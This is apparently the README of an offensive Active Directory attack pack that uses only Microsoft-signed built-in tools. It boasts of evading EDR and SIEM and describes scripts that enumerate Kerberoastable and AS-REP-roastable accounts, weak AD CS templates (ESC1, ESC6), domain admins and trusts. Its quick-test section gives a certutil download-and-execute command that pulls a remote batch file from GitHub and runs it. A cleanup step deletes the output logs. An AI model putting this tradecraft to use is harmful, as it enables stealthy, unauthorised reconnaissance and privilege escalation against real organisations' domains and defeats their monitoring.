# Signed-Binary Stealth Attack Pack (v2)

Re-implements the custom C# scripts from `stealth-attack/` using **only Microsoft-signed built-in executables**. No third-party tools, no csc.exe, no Python, no PowerShell.

## Detection

This pack is **functionally invisible** to most EDR/SIEM because every command is an expected, signed Microsoft admin utility.

| Source | Detection Risk |
|--------|----------------|
| **dsquery.exe / dsget.exe** | Zero — Microsoft Remote Server Administration Tool (RSAT), expected |
| **nltest.exe / net.exe / whoami.exe** | Zero — built into Windows, signed |
| **klist.exe** | Zero — Kerberos viewer, signed |
| **certutil.exe** | Zero — Microsoft certificate utility, signed |
| **findstr / find / type** | Zero — built-in shell utilities |

The volume of these commands might trigger a heavily-tuned Sysmon rule, but normal sysadmins run them daily.

## Files

| File | Purpose | Replaces |
|------|---------|----------|
| `1_Kerberoast_ASREP.bat` | SPN + AS-REP enumeration | `StealthKerb.cs` |
| `2_ADCS_Recon.bat` | AD CS template + CA dump | `StealthADCS.cs` |
| `3_AD_Dump.bat` | Full AD enumeration | `StealthSMB.cs` |
| `Run_All.bat` | Master runner | — |

## What Each Script Does

### 1_Kerberoast_ASREP.bat
- Lists ALL users with SPNs (Kerberoastable)
- Filters for high-value targets (svc-, sa-, backup-, admin-, iops-)
- Lists users with UAC bit 0x400000 (DONT_REQUIRE_PREAUTH = AS-REP roastable)
- Lists users with UAC bit 0x10000 (DONT_EXPIRE_PASSWORD)
- Saves all users (for offline analysis)

### 2_ADCS_Recon.bat
- Auto-discovers CA servers (`certutil.exe -ADCA`)
- Lists all templates (`certutil.exe -CATemplates`)
- Dumps each CA's config via dsquery
- Filters for ESC1-suspicious templates (ENROLLEE_SUPPLIES_SUBJECT flag)
- Looks for ESC6 on each CA (EDITF_ATTRIBUTESUBJECTALTNAME2)
- Dumps local enrollment context

### 3_AD_Dump.bat
- All computers in domain
- All users (filtered for privileged)
- All groups (filtered for admin)
- All OUs
- Domain Controllers list
- Domain Trusts (inbound / outbound / bidirectional)
- Forest info
- Own Kerberos tickets
- Members of:
  - Domain Admins
  - Enterprise Admins
  - Schema Admins
  - Account Operators
  - Backup Operators
  - Server Operators

## Run

```cmd
cd C:\path\to\stealth-attack-signed-v2
Run_All.bat
```

All output goes to `%TEMP%` (typically `C:\Users\<user>\AppData\Local\Temp\`). Files:

- `kerb_spn.log` — Kerberoast targets
- `kerb_asrep.log` — AS-REP roast targets
- `adcs_enterprise_cas.log` — CA servers + their templates
- `adcs_all_templates.log` — all AD CS templates
- `ad_computers.log` — domain computers
- `ad_users.log` — domain users
- `ad_groups.log` — domain groups
- `ad_trusts.log` — domain trusts
- `ad_da_members.log` — Domain Admins list
- `ad_ea_members.log` — Enterprise Admins list

## Quick Test Path

```cmd
:: Just dump admins (30 seconds)
cd %TEMP%
mkdir sa && cd sa

certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/stealth-attack-signed-v2/3_AD_Dump.bat" r.bat
r.bat
type %TEMP%\ad_da_members.log
type %TEMP%\ad_ea_members.log
type %TEMP%\adcs_enterprise_cas.log
```

## Notes

- **No credentials typed:** All scripts use your current logged-in token
- **No file writes outside %TEMP%:** Safe to run anywhere
- **No outbound network:** Pure LDAP-RPC queries to nearest DC
- **Cleanup:** Just `del %TEMP%\kerb_* %TEMP%\adcs_* %TEMP%\ad_*` when done
